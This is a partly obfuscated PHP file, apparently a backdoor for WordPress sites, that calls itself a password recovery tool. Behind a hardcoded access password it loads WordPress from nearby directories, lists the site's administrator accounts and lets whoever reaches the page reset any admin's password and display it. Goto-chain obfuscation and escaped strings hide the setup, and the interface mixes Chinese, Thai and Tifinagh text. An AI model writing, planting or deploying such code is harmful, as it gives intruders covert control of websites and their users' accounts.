<?php
 goto huAAc; rthzu: jEguT: goto fkEAg; LMJii: eAE7A: goto RieDO; GJVES: goto sBJYf; goto r2AgY; EczTl: goto xVYSl; goto lOasL; fkEAg: sDzQc: goto yiXmG; KCzPf: if (empty($_SESSION["\x74\x6f\157\x6c\137\141\165\164\150"])) { if (isset($_POST["\166\x65\x72\151\146\x79"])) { if ($_POST["\164\157\157\154\137\160\141\x73\x73\x77\157\162\144"] === $tool_pass) { $_SESSION["\x74\157\157\x6c\137\141\x75\164\x68"] = true; } else { die("\340\xb8\243\xe0\270\xab\340\xb8\261\340\270\252\xe0\270\234\xe0\xb9\210\340\270\xb2\340\xb8\231\340\271\x84\xe0\270\xa1\340\xb9\x88\340\xb8\226\xe0\xb8\xb9\xe0\xb8\201\xe0\270\225\340\xb9\211\xe0\270\255\xe0\xb8\x87"); } } else { echo "\12\40\40\40\x20\40\x20\40\x20\74\x68\x33\x3e\x57\x6f\162\x64\120\x72\145\163\x73\xe5\xaf\x86\xe7\xa0\x81\346\201\242\345\xa4\215\xe5\xb7\xa5\345\205\267\x3c\x2f\x68\63\x3e\xa\40\x20\40\40\40\x20\40\x20\x3c\x66\157\x72\x6d\40\x6d\145\x74\150\x6f\144\x3d\42\x70\x6f\x73\164\x22\76\xa\40\40\40\x20\x20\40\x20\40\x3c\151\x6e\x70\x75\164\x20\x74\171\160\145\x3d\42\x70\141\x73\163\167\x6f\x72\x64\42\x20\156\141\155\145\75\42\164\157\157\x6c\137\160\x61\x73\163\167\x6f\162\144\x22\x3e\12\40\40\40\40\x20\40\40\x20\74\142\x75\164\x74\x6f\x6e\x20\x6e\x61\155\145\75\42\x76\x65\x72\x69\x66\x79\42\x3e\xe8\277\233\345\205\245\74\x2f\142\x75\x74\164\157\x6e\x3e\12\x20\x20\x20\x20\x20\x20\40\x20\x3c\x2f\146\x6f\162\x6d\x3e"; die; } } goto NrbgL; qVjkl: OJusZ: goto X65Mn; NrbgL: $wp_status = false; goto c8m_y; huAAc: goto xbFL9; goto LMJii; MygkD: xVYSl: goto OHYjQ; xTpN7: error_reporting(E_ALL); goto XVA4H; HpX56: CeDdd: goto KYj74; sEdPF: goto jEguT; goto SHwvB; KYj74: goto mneYQ; goto z_etR; eOjko: goto YTBsN; goto HpX56; fhJdj: goto CeDdd; goto FjRAt; OHYjQ: sBJYf: goto SD0Eg; SHwvB: xbFL9: goto pHqGK; r2AgY: goto OJusZ; goto qVjkl; FjRAt: W4jP0: goto ht98X; OVFiX: zE_Z4: goto GJVES; gAIrZ: EIQBs: goto KCzPf; nxbyh: afqKw: goto nBSj7; SewOR: RhLlU: goto vyepE; SD0Eg: goto HPHDP; goto SewOR; xiPEh: goto EIQBs; goto OVFiX; ht98X: K90Na: goto eOjko; vyepE: session_start(); goto xiPEh; luQy1: goto RhLlU; goto fR0E4; v0zbS: ini_set("\x64\151\163\x70\154\x61\171\137\x65\x72\162\x6f\x72\x73", 1); goto knW0J; X65Mn: mneYQ: goto luQy1; RieDO: $tool_pass = "\147\141\x39\x36\x38\70"; goto fhJdj; nBSj7: goto sDzQc; goto sEdPF; yiXmG: goto eAE7A; goto gAIrZ; z_etR: goto W4jP0; goto nxbyh; knW0J: goto afqKw; goto MygkD; XVA4H: goto zE_Z4; goto rthzu; pHqGK: goto K90Na; goto EczTl; c8m_y: $wp_locations = array(__DIR__ . "\x2f\167\160\55\154\157\141\x64\x2e\160\x68\x70", dirname(__DIR__) . "\57\x77\160\x2d\x6c\x6f\141\x64\56\160\x68\x70", dirname(dirname(__DIR__)) . "\57\167\x70\x2d\x6c\157\x61\x64\56\160\150\160", $_SERVER["\x44\x4f\103\125\x4d\105\116\x54\137\122\117\x4f\x54"] . "\x2f\167\x70\x2d\x6c\157\x61\x64\56\160\x68\160"); goto KkkgT; fR0E4: YTBsN: goto xTpN7; lOasL: HPHDP: goto v0zbS; KkkgT: foreach ($wp_locations as $wp_file) { if (file_exists($wp_file)) { require_once $wp_file; $wp_status = true; break; } }


if(!$wp_status || !function_exists('get_users')){

    die("WordPress加载失败");

}



/* 生成密码 */
function build_random_pass($size=12){

    $pool="abcdefghijkmnpqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ23456789!@#$";

    $result="";

    for($n=0;$n<$size;$n++){

        $result.=$pool[random_int(0,strlen($pool)-1)];

    }

    return $result;

}



/* 修改密码 */
if(isset($_POST['change_pass'])){


    $target_uid=intval($_POST['target_uid']);


    $target_user=get_user_by(
        'id',
        $target_uid
    );


    if(!$target_user){

        die("用户不存在");

    }


    $new_pass=trim($_POST['new_pass']);


    if(!$new_pass){

        $new_pass=build_random_pass();

    }


    wp_set_password(
        $new_pass,
        $target_uid
    );


    echo "
    <h2 style='color:green'>
    修改成功
    </h2>

    用户名：
    <b>{$target_user->user_login}</b>

    <br><br>

    邮箱：
    {$target_user->user_email}

    <br><br>

    用户ID：
    {$target_uid}

    <br><br>

    新密码：
    <b>{$new_pass}</b>

    ";

    exit;

}



/* 获取管理员 */
$admin_list=get_users([

    'role'=>'administrator',
    'number'=>500,
    'orderby'=>'ID',
    'order'=>'ASC'

]);

?>




<?php
 goto oHJD0; oHJD0: ?>
<form method="post">选择管理员：<br><select name="target_uid"style="width:350px"><?php  goto qxqyh; qxqyh: foreach ($admin_list as $admin) { ?>
<option value="<?php  echo $admin->ID; ?>
">ID:<?php  echo $admin->ID; echo esc_html($admin->user_login); ?>
(<?php  echo esc_html($admin->user_email); ?>
)</option><?php  } goto wXYID; wXYID: ?>
</select><br><br>ⴰⵡⴰⵍ ⵓⴼⴼⵉⵔ ⴰⵎⴰⵢⵏⵓⵜ:<br><input name="new_pass"placeholder="留空自动生成"><br><br><button name="change_pass">修改密码</button></form>